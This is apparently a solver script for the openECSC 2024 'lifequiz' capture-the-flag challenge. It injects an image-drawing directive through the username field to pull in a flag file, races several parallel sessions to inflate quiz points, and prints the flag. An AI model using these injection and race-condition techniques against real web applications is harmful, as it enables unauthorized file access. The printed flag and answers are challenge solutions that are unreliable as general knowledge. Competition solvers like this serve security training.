#!/usr/bin/env python3

import asyncio
import itertools
import logging
import os
import random
import re
import string
from http.cookiejar import CookieJar

import httpx

logging.disable()

URL = os.environ.get("URL", "http://lifequiz.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]


class NullCookieJar(CookieJar):
    def extract_cookies(self, *_):
        pass

    def set_cookie(self, _):
        pass


async def get_session(client: httpx.AsyncClient, email: str, password: str) -> str:
    resp = await client.post(f'{URL}/login.php', data={'email': email, 'password': password}, cookies={})
    resp.raise_for_status()

    assert "<meta http-equiv='refresh' content='0;url=/'>" in resp.text

    return resp.cookies["PHPSESSID"]


async def submit_quiz(client: httpx.AsyncClient, session: str, answer: str) -> tuple[bool, bool, int]:
    resp = await client.post(f'{URL}/quiz.php', data={'answer': answer}, cookies={'PHPSESSID': session})
    resp.raise_for_status()

    if 'you need at least 15 points to get the prize :(' in resp.text:
        return True, False, 0

    match = re.findall('Question (\\d+)', resp.text)
    assert len(match) == 1

    return False, 'Correct' in resp.text, int(match[0])


async def get_points(client: httpx.AsyncClient, session: str) -> int:
    resp = await client.get(f'{URL}/quiz.php', cookies={'PHPSESSID': session})
    resp.raise_for_status()

    match = re.findall('You have (\\d+) points', resp.text)
    assert len(match) == 1

    return int(match[0])


async def run(sess_count: int):
    email = ''.join(random.choices(string.ascii_letters, k=16))

    async with httpx.AsyncClient(follow_redirects=False, cookies=NullCookieJar()) as client:
        resp = await client.post(f'{URL}/login.php',
                                 data={'username': '"image Src 0,0 0,0 "/prizes/flag.jpg', 'email': email})
        resp.raise_for_status()

        match = re.findall(r'Your password is "(.+?)"', resp.text)
        assert len(match) > 0

        sessions = await asyncio.gather(*[get_session(client, email, match[0]) for _ in range(sess_count)])
        assert len(set(sessions)) == len(sessions)

        answers = ['42', 'To express emotions', 'To be free', 'Yes', 'In the city']

        step = 0
        while True:
            ans_id = step % 5

            tasks = []
            for sess in sessions:
                tasks.append(asyncio.ensure_future(submit_quiz(client, sess, answers[ans_id])))

            results = await asyncio.gather(*tasks)
            for failed, correct, question in results:
                if failed:
                    assert False, 'No more attempts'

                if correct:
                    print(step, 'CORRECT')

                step = max(question, step)

            points, = await asyncio.gather(get_points(client, sessions[0]))
            print(step, 'POINTS', points)
            if points >= 15:
                break

            await asyncio.sleep(1)

        resp = await client.get(f'{URL}/get_prize.php', cookies={'PHPSESSID': sessions[0]})
        resp.raise_for_status()

        assert 'Your prize is ready' in resp.text

        resp = await client.get(f'{URL}/prize.php', cookies={'PHPSESSID': sessions[0]})
        resp.raise_for_status()

        assert 'Congratulations, you won!' in resp.text

        resp = await client.get(f'{URL}/throphy.php', cookies={'PHPSESSID': sessions[0]})
        resp.raise_for_status()

        assert 'No prize for you' not in resp.text

        print('openECSC{U_4re_4_Qu1z_m4s7er}')


async def main():
    for c in itertools.cycle([4, 6]):
        try:
            await run(c)
            return
        except Exception as e:
            print('Retrying:', e)


if __name__ == '__main__':
    asyncio.run(main())
